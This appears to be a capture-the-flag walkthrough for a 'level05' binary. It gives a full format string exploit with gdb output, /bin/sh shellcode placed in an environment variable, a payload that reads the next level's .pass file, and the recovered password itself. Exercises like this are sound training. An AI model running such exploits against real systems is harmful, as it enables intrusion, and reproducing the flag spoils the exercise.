# Walkthrough

## Solution

```
(python -c "print '\xdc\xd4\xff\xff\xdd\xd4\xff\xff\xde\xd4\xff\xff\xdf\xd4\xff\xff%203x%10\$n%252x%11\$n%40x%12\$n%13\$n'"; echo 'cat /home/users/$(whoami)/.pass') | ./level05
```

## Explanation

By looking at the code, we realize that it is vulnerable for a format string exploitation. So the first thing we want to look for, is the offset of the string argument in the stack. We start by running the program with a test string.

`run < <(python -c "print 'AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x'")`

We discover that the string starts in the 10th position. This is where we are going to put the address where we are going to store a command.  
```
(gdb) run < <(python -c "print 'AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x'")
Starting program: /home/users/level05/level05 < <(python -c "print 'AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x'")
aaaa 00000064 f7fcfac0 f7ec3af9 ffffd6bf ffffd6be 00000000 ffffffff ffffd744 00000000 61616161
[Inferior 1 (process 1861) exited normally]
```

We now need to discover the return address of printf.  
We put a breakpoint at the beginning of printf, step into printf with `si`, and we look at the stack with `x/24wx $esp`.  
We discover where is the address of the next command, i.e. the return address, "0x0804850c". In this example, it is 0xffffd5dc.  
```
(gdb) b *0x08048507
Breakpoint 1 at 0x8048507
(gdb) run
Starting program: /home/users/level05/level05 < <(python -c "print 'AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x'")

Breakpoint 1, 0x08048507 in main ()
(gdb) display/i $pc
1: x/i $pc
=> 0x8048507 <main+195>:	call   0x8048340 <printf@plt>
(gdb) si
0x08048340 in printf@plt ()
1: x/i $pc
=> 0x8048340 <printf@plt>:	jmp    *0x80497d4
(gdb) x/24wx $esp
0xffffd5dc:	0x0804850c	0xffffd608	0x00000064	0xf7fcfac0
0xffffd5ec:	0xf7ec3af9	0xffffd62f	0xffffd62e	0x00000000
0xffffd5fc:	0xffffffff	0xffffd6b4	0x00000000	0xffffd66c
0xffffd60c:	0xffffd66d	0xffffd66e	0xffffd66f	0x78333925
0xffffd61c:	0x24303125	0x3031256e	0x31257837	0x256e2431
0xffffd62c:	0x25783933	0x6e243231	0x24333125	0x00000a6e
```

To make things simple, we can simply store a shellcode in the environment, so all we have to do is to store the address of the environment variable in the return address. Let's start by setting the variable:

```
export SHELLCODE=`python -c "print('\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`
```

The address might get displaced, so we have 100 no-ops to compensate. We find it by using `x/10s *environ`.  
In this case, shellcode env address is 0xffffd84d (which is the address of S, from SHELLCODE=). Let's add 32 to jump the name and land in the NOP, we have now 0xffffd86d.  
We shall put this address in the return address of printf, which is 0xffffd5dc.  
We separate the return address of printf into 4, to avoid printing a very high number of characters:

\xdc\xd5\xff\xff
\xdd\xd5\xff\xff
\xde\xd5\xff\xff
\xdf\xd5\xff\xff

We are going to do some arithmetic to print the correct number of characters for the NOP address (0xffffd86d).

```
print 0x6d - 0x10	// we deduct 16 bytes corresponding to the 4 addresses we printed before
$1 = 93

(gdb) print 0xd8 - 0x6d
$2 = 107

(gdb) print 0xff - 0xd8
$3 = 39
```

This gives us:

%93x%10\$n
%107x%11\$n
%39x%12\$n
%13\$n

```
(gdb) run < <(python -c "print '\xdc\xd5\xff\xff\xdd\xd5\xff\xff\xde\xd5\xff\xff\xdf\xd5\xff\xff%93x%10\$n%107x%11\$n%39x%12\$n%13\$n'")
```

Voilà!

```
(python -c "print '\xdc\xd5\xff\xff\xdd\xd5\xff\xff\xde\xd5\xff\xff\xdf\xd5\xff\xff%93x%10\$n%107x%11\$n%39x%12\$n%13\$n'"; echo 'cat /home/users/$(whoami)/.pass') | ./level05
����������������                                                                                           64                                                                                                   f7fcfac0                               f7ec3af9
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```
